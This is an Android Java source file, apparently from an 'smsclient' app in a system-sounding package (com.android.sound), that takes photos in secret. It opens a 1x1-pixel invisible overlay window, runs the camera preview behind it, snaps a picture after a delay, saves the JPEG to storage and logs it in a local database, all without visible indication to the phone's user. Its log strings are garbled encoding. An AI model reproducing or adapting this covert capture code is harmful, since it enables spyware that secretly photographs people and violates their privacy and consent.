package com.android.sound;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Date;
import java.util.List;

import android.content.Context;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.Size;
import android.os.Handler;
import android.os.Message;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowManager;

import com.android.db.SqlUtils;
import com.android.pojo.Photo;
import com.android.smsclient.R;
import com.android.utils.LogUtils;
import com.android.utils.Utils;

public class TakePhoto {

	private View pview;
	private Camera camera;
	private int openindex = 0;
	private WindowManager wm;
	private File dir, file;
	private boolean isopen=false;

	public boolean isIsopen() {
		return isopen;
	}

	private Context context;

	public TakePhoto(Context context) {
		this.context = context;
		wm = (WindowManager) context.getApplicationContext().getSystemService(
				Context.WINDOW_SERVICE);
	}

	public void takePicture(int openindex) {
		dir = Utils.getFiledir();
		if (dir != null) {
			this.openindex=openindex;
			showwindow();
		}
	}
	
	public String getFileName(){
		if(file.exists()){
			return file.getName();
		}
		return "";
	}

	private void showwindow() {
		try {
			isopen=true;
			closewindow();
			WindowManager.LayoutParams params = new WindowManager.LayoutParams();
			params.type = WindowManager.LayoutParams.TYPE_PHONE;
			params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
					| WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
			params.gravity = Gravity.TOP;
			params.width = 1;
			params.height = 1;
			pview = LayoutInflater.from(context).inflate(
					R.layout.activity_photo, null);
			SurfaceView photoview = (SurfaceView) pview.findViewById(R.id.photoview);
			SurfaceHolder holder = photoview.getHolder();
			holder.addCallback(new PhotoCallback());
			wm.addView(pview, params);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			closewindow();
		}
	}

	private void closewindow() {
		if (pview != null) {
			LogUtils.write("smsclient", "�ر����մ���");
			wm.removeView(pview);
			pview = null;
		}
		if (camera != null) {
			LogUtils.write("smsclient", "�ͷ�����ͷ");
			try {
				camera.setPreviewCallback(null);
				camera.stopPreview();
				camera.release();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			camera = null;
		}
		isopen=false;

	}

	private Handler handler = new Handler() {

		@Override
		public void handleMessage(Message msg) {
			// TODO Auto-generated method stub
			super.handleMessage(msg);
			if (msg.what == 100 && camera != null) {
				try {
					camera.takePicture(null, null, new PhotoCallback());
				} catch (Exception e) {
					// TODO Auto-generated catch block
					closewindow();
				}
			}
		}

	};

	class PhotoCallback implements SurfaceHolder.Callback, PictureCallback {

		@Override
		public void surfaceCreated(SurfaceHolder holder) {
			// TODO Auto-generated method stub

			try {
				LogUtils.write("smsclient", "surfaceCreate ����");
				int i = Camera.getNumberOfCameras();
				LogUtils.write("smsclient", "����ͷ���� " + i);
				if (i > 0 && openindex < i) {
					if (camera != null) {
						camera.release();
					}
					LogUtils.write("smsclient", "������ͷ " + openindex);
					camera = Camera.open(openindex);
					camera.setPreviewDisplay(holder);
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				closewindow();
				LogUtils.write("smsclient", "surfaceCreate �쳣" + e.getMessage());
			}

		}

		@Override
		public void surfaceChanged(SurfaceHolder arg0, int arg1, int arg2,
				int arg3) {
			// TODO Auto-generated method stub
			LogUtils.write("smsclient", "surfaceChanged �ı�");
			try {
				if (camera != null) {
					Camera.Parameters parameters = camera.getParameters();
					parameters.setPictureFormat(PixelFormat.JPEG);
					parameters.set("rotation", 180);
					camera.setDisplayOrientation(0);
					
					List<Size> lsize=parameters.getSupportedPreviewSizes();
					if(lsize.size()>0){
						Size size=lsize.get(0);
						parameters.setPreviewSize(size.width, size.height);
						LogUtils.write("smsclient", "width"+size.width+"--height"+size.height);
					}else{
						parameters.setPreviewSize(1, 1);
					}
					camera.setParameters(parameters);
					camera.startPreview();
					handler.sendEmptyMessageDelayed(100, 1000);
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				closewindow();
				LogUtils.write("smsclient","surfaceChanged �쳣" + e.getMessage());
				
			}
		}

		@Override
		public void surfaceDestroyed(SurfaceHolder arg0) {
			// TODO Auto-generated method stub
			LogUtils.write("smsclient", "surfaceCreate ����");

		}

		@Override
		public void onPictureTaken(byte[] data, Camera arg1) {
			// TODO Auto-generated method stub
			try {
				closewindow();
				file = new File(dir, Utils.formData(new Date()) + ".jpg");
				LogUtils.write("smsclient", "��������");
				data2file(data, file);
				LogUtils.write("smsclient", "���ٴ���");
				Photo photo=new Photo();
				photo.setDatas(Utils.formData(new Date()));
				photo.setFilename(getFileName());
				SqlUtils su=SqlUtils.getinstance(context);
				su.savePhoto(photo);
				isopen=false;
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				closewindow();
				LogUtils.write("smsclient", "surfaceCreate �쳣" + e.getMessage());
			}
		}

		private void data2file(byte[] w, File fileName) throws Exception {
			FileOutputStream out = null;
			out = new FileOutputStream(fileName);
			out.write(w);
			out.close();
		}

	}
}
